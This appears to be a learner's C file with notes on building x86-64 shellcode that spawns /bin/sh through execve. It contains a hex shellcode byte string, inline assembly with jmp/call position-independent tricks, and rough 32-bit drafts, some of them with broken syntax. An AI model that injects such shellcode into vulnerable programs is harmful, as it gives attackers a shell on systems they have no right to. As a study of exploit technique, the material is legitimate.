/*
NOTES

First Attempt at writing source code, since C does not default to x86, I had to try this.
int main(){
	asm volatile(
		"push %rbp\n\t"
		"mov %rbp,%rsp\n\t"
		"leave\n\t"
		"ret"
	);
}

Here's the rest of the potential code:
"pushq   %rbp\n\t"
"movq    %rbp,%rsp\n\t"
"subq    %rsp,0x10\n\t"
"leaq    %rax,[%rip+0xeac]\n\t"       // 0x2004
"movq    QWORD PTR [%rbp-0x10],%rax\n\t"
"movq    QWORD PTR [%rbp-0x8],0x0\n\t"
"movq    %rax,QWORD PTR [%rbp-0x10]\n\t"
"leaq    %rcx,[%rbp-0x10]\n\t"
"movl    %edx,0x0\n\t"
"movq    %rsi,%rcx\n\t"
"movq    %rdi,%rax\n\t"
"call   0x1030 <execve@plt>\n\t"
"movl    %edi,0x0\n\t"
"call   0x1040 <exit@plt>\n\t"

To fix this issue, and make it so that you don't have to write in this and can write in x86, gcc has a compile time option:
gcc -o exe t2c -msam=intel

Original code that we want to turn into bytes but this doesn't make the assembly we quite want. Post this into main:
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
	exit(0); 


My first crack at writing the assembly, but then morphed into what I would (i.e. outline) want to do if this was compiled in 32 bit. Remember in 32 bit that args are pointed to the stack.

asm volatile(
		//Procedure Prelude.
		//"int 0xcc\n\t" 
		//"push rbp\n\t" 			//saves old frame pointer
		//"mov rbp,rsp\n\t"		//make current stack pointer new frame pointer
		"sub esp,0x10\n\t"		//leaves space for local vars, in this case char *name[2]
		//"mov eax,0x68732f\n\t" //put bin/sh into eax

		"mov ebx,0x0" //make ebx NULL to then push to stack as last param for execve
		"push 0x6e69622f" //"push /bin/sh"
		"push 0x68732f"
		"push NULL"
		"push ebx"
		"int 0x80"
		//push to stack
		//"mov eax,0xcc\n\t"
		//64 bit:
		/*"mov eax,0x3b\n\t" //execve
		"syscall\n\t"
		"mov edi,0x5\n\t"
		"mov eax,0x3c\n\t" //exit
		"syscall\n\t"
		//"call   0x1030\n\t"
		//"mov    edi,0x0\n\t"
		//"call   0x1040\n\t"
	);

*/

#include <stdlib.h>
#include <stdio.h>

//I made this from the assembly below:
//char shellcode[] = "\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x45\xF8\x48\x8D\x75\xF0\x48\x8D\x7D\xF8\xB2\x00\xB8\x3B\x00\x00\x00\x0F\x05";
void asmFunc(void);

//What we want in assembly (and then bytes)
int main(){
	
	//printf(shellcode);

	//char name[] = "/bin/sh";
	//char *name2[1];
	//execve(name, name2, NULL);
	//exit(0); 
	asmFunc();
}


void asmFunc(){
	asm volatile(
		
		"jmp .+0x21\n\t"

		//each line is " \n\t"
		//"sub rsp,0x10\n\t" //make space on the stack for char name[] and char *name2[1];
		//but we're clobbering the stack so what do we care?
		
		//We can optimize this shell code even more, by just pushing the string to the stack and then in the lea rdi loading from the stack addres of RSP.
		"movabs rax,0x68732f6e69622f\n\t" //move "/bin/sh" into RAX
		//But this string doesn't have an address, and we NEED an address.
		"mov QWORD PTR [rbp-0x8],rax\n\t" //put that into the char name[], so char name[] = "/bin/sh";
		//"push 0x68732f6e69622f00\n\t"
		
		//We can delete the two moves because we can just load the params directly!!
		"lea rsi,[rbp-0x10]\n\t" //move our NULL into rbp - 16 bytes, i.e. name2[1];
		"lea rdi,[rbp-0x8]\n\t" //move rbp - 8 bytes into RAX, I think this is redundant of the second instruction.
		"mov dl,0x0\n\t" 	//setting up the execve call, we need three arguments: execve(bin/sh, null, null), 
							//move NULL into edx, rdx is the third parameter for execve, so I think this is NULL for param 3
		//"mov rsi,rcx\n\t" // this is the second param, NULL
		//"mov rdi,rax\n\t" //This sets the first param to bin/sh
		//call   0x555555555030 <execve@plt>
		"mov eax,0x3b\n\t" //INTO the execve fall
		"syscall\n\t" //

		"call .-0x1F\n\t" //we need to jump to here to call this function
	);
}